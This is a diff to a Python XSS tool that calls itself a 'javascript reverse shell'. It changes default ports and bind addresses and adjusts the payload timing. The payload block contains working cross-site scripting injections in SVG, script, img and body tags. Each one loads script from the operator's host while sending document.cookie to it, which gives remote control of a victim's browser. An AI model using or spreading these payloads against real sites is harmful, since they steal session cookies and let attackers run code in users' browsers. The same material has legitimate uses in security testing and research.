@@ -29,8 +29,8 @@ exit, quit            Exit the JS shell'''
 
 
 parser = argparse.ArgumentParser(description='JSshell 3.1: javascript reverse shell')
-parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
-parser.add_argument('-s', help='local source address', dest='host', default='')
+parser.add_argument('-p', help='local port number (default: 4000)', dest='port', default=4000)
+parser.add_argument('-s', help='local source address', dest='host', default='127.0.0.1')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
 parser.add_argument('-c', help='command to execute after got shell', dest='command', default=str())
 parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
@@ -60,9 +60,9 @@ gene = args.gene
 cmd = format(args.command)
 secs = float(format(args.secs))
 payload = '''
- - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
- - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
+ - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},999)>
+ - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},999)</script>
+ - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},999)>
  - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}}></body>
 '''.format(host, port)
 
@@ -98,7 +98,7 @@ def shell():
         except:
             pass
 
-        s.bind(('0.0.0.0', port))
+        s.bind(('127.0.0.1', port))
         s.listen(0)
 
         try:
@@ -149,9 +149,9 @@ def main():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     try:
-        s.bind(('0.0.0.0', port))
+        s.bind(('127.0.0.1', port))
     except socket.error as msg:
-        print("Can't grab 0.0.0.0:%s with bind: %s" % (port, msg))
+        print("Can't grab 127.0.0.1:%s with bind: %s" % (port, msg))
         quit()
 
     uprint(banner)
